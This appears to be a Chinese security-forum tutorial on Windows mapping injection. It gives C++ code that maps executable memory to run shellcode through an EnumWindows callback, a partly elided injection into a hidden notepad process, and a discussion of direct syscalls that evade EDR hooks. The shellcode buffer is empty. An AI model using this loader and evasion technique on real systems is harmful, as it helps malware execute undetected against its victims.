映射注入是一种内存注入技术，创建Mapping对象本质上属于申请一块物理内存，而申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里，这也就避免使用经典写入函数。  
下图是一个大概的图片，申请一块物理内存，然后映射到本地内存，之后再将其映射到被注入的进程中，这种方式可以避免使用VirtualAllocEx、WriteProcessMemory函数。

![1.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c701d595ff8a752351fb2043d079ad26d154b0a2.png)

用户函数
----

用户层内存映射我们一般使用CreateFileMappingA()、OpenFileMappingA()、MapViewOfFile()、UnmapViewOfFile这四个函数，都是用户层的函数，所以使用起来也较为简单。我们先看看每个函数的作用

### CreateFileMapping

我们可以使用CreateFileMappingA函数来创建一个文件映射对象，原型如下

```php
HANDLE CreateFileMappingA(
  [in]           HANDLE                hFile,
  [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
  [in]           DWORD                 flProtect,
  [in]           DWORD                 dwMaximumSizeHigh,
  [in]           DWORD                 dwMaximumSizeLow,
  [in, optional] LPCSTR                lpName
);
```

- hFile：文件句柄，一般填INVALID\_HANDLE\_VALUE，创建一个新的匿名映射对象
- lpFileMappingAttributes：定义该内存映像是否可以继承
- flProtect：内存映像的保护类型
- dwMaximumSizeHigh：文件映射对象的大小，高32位
- dwMaximumSizeLow：文件映射对象的大小，低32位
- lpName：文件映射对象的名称

### OpenFileMappingA

打开命名文件映射对象

```php
HANDLE OpenFileMappingA(
  [in] DWORD  dwDesiredAccess,
  [in] BOOL   bInheritHandle,
  [in] LPCSTR lpName
);
```

- dwDesiredAccess：指定的保护类型
- bInheritHandle：返回的句柄是否可继承
- lpName：要打开的文件映射对象的名称（就是CreateFileMappingA中指定的名称）

### MapViewOfFile

将此内存空间映射到调用进程的内存空间当中

```php
LPVOID MapViewOfFile(
  [in] HANDLE hFileMappingObject,
  [in] DWORD  dwDesiredAccess,
  [in] DWORD  dwFileOffsetHigh,
  [in] DWORD  dwFileOffsetLow,
  [in] SIZE_T dwNumberOfBytesToMap
);
```

- hFileMappingObject：CreateFileMappingA或OpenFileMappingA返回的句柄
- dwDesiredAccess：指定的保护类型
- dwFileOffsetHigh：文件偏移量的高32位，用于指定文件映射的起始位置
- dwFileOffsetLow：文件偏移量的低32位，用于指定文件映射的起始位置
- dwNumberOfBytesToMap：需要映射的文件字节数，为0则映射整个文件

如果要将此内存空间映射到指定进程的内存空间中，可以使用MapViewOfFile2、MapViewOfFile3，用法与MapViewOfFile区别不大

### UnmapViewOfFile

解除对文件映射对象的映射

```php
BOOL UnmapViewOfFile(
  [in] LPCVOID lpBaseAddress
);
```

- lpBaseAddress：需要解除映射的视图的起始地址

我们用编写两个简单的程序，来理解一下内存映射

Write&amp;Read
--------------

Write.cpp  
一个是Write.cpp文件，用于创建一个内存映射对象命名为Mapping，然后调用MapViewOfFile函数将创建的内存映射对象映射到当前进程的内存空间中，然后调用memcpy将buf中的内容写入到内存空间中

```php
#include <windows.h>
#include <iostream>

using namespace std;

int main() {
    unsigned char buf[] = "HelloHelloHelloHelloHelloHelloHelloHelloHelloHelloHello";
    DWORD pflOldProtect = 0;

    HANDLE CreateFileM = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(buf), "Mapping");
    if (CreateFileM == NULL) {
        cout << "[-] CreateFileMappingA Error: " << GetLastError() << endl;
        return 1;
    }
    cout << "[+] CreateFileMappingA Success" << endl;

    LPVOID Address = MapViewOfFile(CreateFileM, FILE_MAP_EXECUTE | FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (Address == NULL) {
        cout << "[-] MapViewOfFile Error: " << GetLastError() << endl;
        return 1;
    }
    memcpy(Address, buf, sizeof(buf));
    cout << "[+] Success Write Data" << endl;

    system("pause");
    UnmapViewOfFile(Address);
    CloseHandle(CreateFileM);
}
```

Read.cpp  
用于打开Write.cpp中创建的内存映射对象，并读取内存空间中的数据

```php
#include <windows.h>
#include <iostream>

using namespace std;

int main(){
    HANDLE OpenFileM = OpenFileMappingA(FILE_MAP_READ, FALSE, "Mapping");
    if (OpenFileM == NULL) {
        cout << "[-] Open Mapping Error: " << GetLastError() << endl;
        return 1;
    }
    cout << "[+] Open Mapping Success" << endl;

    LPVOID Address = MapViewOfFile(OpenFileM, FILE_MAP_READ, 0, 0, 0);
    if (Address == NULL) {
        cout << "[-] MapViewOfFile Error: " << GetLastError() << endl;
    }
    wcout << "[+] Success read: " << (char*)Address << endl;

    system("pause");
    UnmapViewOfFile(Address);
    CloseHandle(OpenFileM);
}
```

![2.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c2c25d8ff3b85fce3ef8f8abfbc6722abedf6b19.png)

用户函数实现
------

现在是不是很清晰了，现在我们看看如何利用其进程注入，根据前面的知识，我们现在可以很清晰的知道接下来的思路

- 用CreateFileMappingA函数创建一个文件映射对象
- 使用MapViewOfFile将文件映射对象映射到本地进程内存空间中
- 然后将我们的数据写入到内存空间中

```php
#include <windows.h>
#include <iostream>

using namespace std;

int main() {
    unsigned char buf[] = "";

    DWORD pflOldProtect = 0;
    //创建一个文件映射对象
    HANDLE CreateFileM = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(buf), NULL);
    //将创建的文件映射对象映射到当前进程的内存空间
    LPVOID Address = MapViewOfFile(CreateFileM, FILE_MAP_EXECUTE| FILE_MAP_READ| FILE_MAP_WRITE, 0, 0, 0);
    if (Address == NULL) {
        cout << "[-] MapViewOfFile Error: " << GetLastError() << endl;
    }
    memcpy(Address, buf, sizeof(buf));
    EnumWindows((WNDENUMPROC)Address, NULL);

    UnmapViewOfFile(Address);
    CloseHandle(CreateFileM);
}
```

![3.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-1600fb23ab9e21703da79ae0858ed70b0c4124b9.png)  
那怎么实现远程线程注入呢，也是非常的简单，只需要调用MapViewOfFile2或者MapViewOfFile3函数，将创建的映射对象映射到指定进程即可

实现思路如下：

- 使用CreateProcessA函数创建一个进程
- 用CreateFileMappingA函数创建一个文件映射对象
- 使用MapViewOfFile将文件映射对象映射到本地进程内存空间中
- 然后将我们的数据写入到内存空间中
- 利用MapViewOfFile2或MapViewOfFile3函数将创建的文件映射对象，映射到指定的进程中
- 最后调用执行即可

因为在MapViewOfFile阶段，映射到本地进程内存空间中后，我们利用memcpy将数据写入了内存空间，所有当调用MapViewOfFile2或MapViewOfFile3将映射对象映射到别的进程内存空间中后，其内存空间中也就存在了我们之前写入的数据

```php
#include <windows.h>
#include <iostream>

#pragma comment(lib, "onecore.lib")
using namespace std;

int main() {
    unsigned char buf[] = "";

    DWORD pflOldProtect = 0;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; //隐藏要启动的进程

    CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
    //创建一个文件映射对象
    HANDLE CreateFileM = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(buf), NULL);
    //将创建的文件映射对象映射到当前进程的内存空间
    LPVOID MapView = MapViewOfFile(CreateFileM, FILE_MAP_EXECUTE | FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);

    ................................................
        ................................................
        ................................................

    UnmapViewOfFile(MapView2);
    UnmapViewOfFile(MapView);
    CloseHandle(CreateFileM);
    CloseHandle(pi.hProcess);
}
```

![3.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-fe395fa3ccba5ba6b47f23ff561cfc18949d2071.png)

内核函数
----

我们利用APIMonitorv挂钩来看看，我们可以看见CreateFileMappingA函数调用的是NtCreateSection，MapViewOfFile调用的是NtMapViewOfSection

![4.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-8cba47a20a45aead2e0768b1d247d72fa8694299.png)

MSDN官网有这两个函数的定义，我们来看看

### NtCreateSection

用于创建一个新的内存映射文件对象

```php
__kernel_entry NTSYSCALLAPI NTSTATUS NtCreateSection(
  [out]          PHANDLE            SectionHandle,
  [in]           ACCESS_MASK        DesiredAccess,
  [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,
  [in, optional] PLARGE_INTEGER     MaximumSize,
  [in]           ULONG              SectionPageProtection,
  [in]           ULONG              AllocationAttributes,
  [in, optional] HANDLE             FileHandle
);
```

- SectionHandle：接收节对象的句柄的HANDLE变量的指针
- DesiredAccess：指定一个ACCESS\_MASK值
- ObjectAttributes：指向OBJECT\_ATTRIBUTES结构的指针，指定内存段对象的属性
- MaximumSize：指定内存映射文件对象的最大大小（以字节为单位）
- SectionPageProtection：指定要在节中的每个页面上放置的保护属性，可参阅CreateFileMapping
- AllocationAttributes：指定确定节的分配属性的 SEC\_*XXX* 标志的位掩码，同样可参阅CreateFileMapping
- FileHandle：指定打开的文件对象的句柄，可为NULL

### NtMapViewOfSection

将某一内存段对象映射到指定进程的内存空间中

```php
NTSYSAPI NTSTATUS NtMapViewOfSection(
  [in]                HANDLE          SectionHandle,
  [in]                HANDLE          ProcessHandle,
  [in, out]           PVOID           *BaseAddress,
  [in]                ULONG_PTR       ZeroBits,
  [in]                SIZE_T          CommitSize,
  [in, out, optional] PLARGE_INTEGER  SectionOffset,
  [in, out]           PSIZE_T         ViewSize,
  [in]                SECTION_INHERIT InheritDisposition,
  [in]                ULONG           AllocationType,
  [in]                ULONG           Win32Protect
);
```

- SectionHandle：Section对象的句柄，一般由NtCreateSection或NtOpenSection返回
- ProcessHandle：要映射到指定进程的句柄
- BaseAddress：接收视图基址的变量的指针
- ZeroBits：指定映射到进程的开始地址低位的位数
- CommitSize：指定视图最初提交的区域的大小（以字节为单位）
- SectionOffset：指定要映射的内存段在文件中的偏移量的64位整数
- ViewSize：指向SIZE\_T变量的指针，一般填0，映射整个视图
- InheritDisposition：是否从父进程继承映射的标志
- AllocationType：指定要分配的内存的类型的标志，有关MEM\_*XXX* 标志参阅VirtualAlloc
- Win32Protect：指定映射到进程的内存段的保护属性的标志，一般填PAGE\_READWRITE

可以看到，函数比用户层函数要复杂一些  
利用NtCreateSection用于创建一个新的内存映射文件对象

![5.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-6d3493c46ab027832126b6a6b0dc542b98294ad3.png)

NtMapViewOfSection将某一内存段对象映射到本地进程的内存空间中，并写入数据

![6.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-20c09d12317fe1ec63231e5687af35c9fa4ba89b.png)  
最后回调执行，取消映射对象

![7.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a2ade5fb9f205a763c42f2c92625e3b98c14d898.png)

![3.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-b756292971e95d394a04745a6b0cbcad59d3a73e.png)

直接系统调用
------

虽然利用映射的方式去加载可以避免VirtualAllocEx、WriteProcessMemory函数API，但是EDR早已对其进行了挂钩，因此我们可以直接对其进行调用。  
通过上面APIMonitorv我们可以看到NtCreateSection、NtMapViewOfSection调用的DLL是KERNELBASE.dll

![4.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-fe38f62565f6e794fb2148c7b53f0161958fe793.png)  
我们用IDA看一下，发现其是从ntdll.dll中导入的

![8.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-03282a9230c3409dfd25e4c6732e2b9a618c279a.png)  
![9.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-22980f9b4b3654dc9a621600cdbd1e836d2915ca.png)  
我们打开ntdll.dll可以看见NtCreateSection中传入eax的值为4Ah

![10.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-db3840ae24c878cabd5625b2cf11c9b5747dd332.png)  
NtMapViewOfSection中传入eax的值为28h

![11.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-1fbbcc7d6c1c713f3bba7909fda4a655203a5818.png)  
我们利用直接系统调用来执行

![12.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-e8edfe4333403281608b529268fb16864a48935a.png)

参考：  
<https://learn.microsoft.com/zh-CN/windows/win32/api/winbase/nf-winbase-createfilemappinga> <https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile> <https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection> <https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection>